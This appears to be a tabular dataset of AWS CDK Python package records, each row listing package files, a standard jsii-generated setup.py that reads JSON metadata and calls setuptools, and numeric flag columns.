aws-cdk.aws-kinesisfirehose-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-kinesisfirehose@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-kinesisfirehose"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::KinesisFirehose"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_kinesisfirehose"",
        ""aws_cdk.aws_kinesisfirehose._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_kinesisfirehose._jsii"": [
            ""aws-kinesisfirehose@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_kinesisfirehose"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kinesis==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.region-info==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 4 - Beta"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-kms-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-kms@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-kms"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::KMS"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_kms"",
        ""aws_cdk.aws_kms._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_kms._jsii"": [
            ""aws-kms@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_kms"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.cloud-assembly-schema==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-lambda-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-lambda@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-lambda"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::Lambda"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_lambda"",
        ""aws_cdk.aws_lambda._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_lambda._jsii"": [
            ""aws-lambda@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_lambda"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-applicationautoscaling==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-codeguruprofiler==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-ecr-assets==1.168.0"",
        ""aws-cdk.aws-ecr==1.168.0"",
        ""aws-cdk.aws-efs==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.aws-s3-assets==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.aws-signer==1.168.0"",
        ""aws-cdk.aws-sns==1.168.0"",
        ""aws-cdk.aws-sqs==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""aws-cdk.region-info==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-lambda-event-sources-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-lambda-event-sources@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-lambda-event-sources"",
    ""version"": ""1.168.0"",
    ""description"": ""Event sources for AWS Lambda"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_lambda_event_sources"",
        ""aws_cdk.aws_lambda_event_sources._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_lambda_event_sources._jsii"": [
            ""aws-lambda-event-sources@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_lambda_event_sources"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-apigateway==1.168.0"",
        ""aws-cdk.aws-dynamodb==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kinesis==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-s3-notifications==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.aws-secretsmanager==1.168.0"",
        ""aws-cdk.aws-sns-subscriptions==1.168.0"",
        ""aws-cdk.aws-sns==1.168.0"",
        ""aws-cdk.aws-sqs==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-lambda-python-alpha-2.37.1a0,0,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-lambda-python-alpha@2.37.1-alpha.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-lambda-python-alpha"",
    ""version"": ""2.37.1.a0"",
    ""description"": ""The CDK Construct Library for AWS Lambda in Python"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_lambda_python_alpha"",
        ""aws_cdk.aws_lambda_python_alpha._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_lambda_python_alpha._jsii"": [
            ""aws-lambda-python-alpha@2.37.1-alpha.0.jsii.tgz""
        ],
        ""aws_cdk.aws_lambda_python_alpha"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk-lib>=2.37.1, <3.0.0"",
        ""constructs>=10.0.0, <11.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 4 - Beta"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 2""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-logs-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-logs@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-logs"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::Logs"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_logs"",
        ""aws_cdk.aws_logs._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_logs._jsii"": [
            ""aws-logs@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_logs"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-s3-assets==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-logs-destinations-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-logs-destinations@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-logs-destinations"",
    ""version"": ""1.168.0"",
    ""description"": ""Log Destinations for AWS CloudWatch Logs"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_logs_destinations"",
        ""aws_cdk.aws_logs_destinations._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_logs_destinations._jsii"": [
            ""aws-logs-destinations@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_logs_destinations"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kinesis==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-rds-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-rds@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-rds"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::RDS"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_rds"",
        ""aws_cdk.aws_rds._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_rds._jsii"": [
            ""aws-rds@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_rds"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.aws-secretsmanager==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-route53-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-route53@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-route53"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::Route53"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_route53"",
        ""aws_cdk.aws_route53._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_route53._jsii"": [
            ""aws-route53@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_route53"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.cloud-assembly-schema==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.custom-resources==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-route53-targets-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-route53-targets@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-route53-targets"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS Route53 Alias Targets"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_route53_targets"",
        ""aws_cdk.aws_route53_targets._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_route53_targets._jsii"": [
            ""aws-route53-targets@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_route53_targets"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-apigateway==1.168.0"",
        ""aws-cdk.aws-cloudfront==1.168.0"",
        ""aws-cdk.aws-cognito==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-elasticloadbalancing==1.168.0"",
        ""aws-cdk.aws-elasticloadbalancingv2==1.168.0"",
        ""aws-cdk.aws-globalaccelerator==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-route53==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.region-info==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-s3-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-s3@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-s3"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::S3"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_s3"",
        ""aws_cdk.aws_s3._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_s3._jsii"": [
            ""aws-s3@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_s3"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-s3-assets-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-s3-assets@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-s3-assets"",
    ""version"": ""1.168.0"",
    ""description"": ""Deploy local files and directories to S3"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_s3_assets"",
        ""aws_cdk.aws_s3_assets._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_s3_assets._jsii"": [
            ""aws-s3-assets@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_s3_assets"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.assets==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
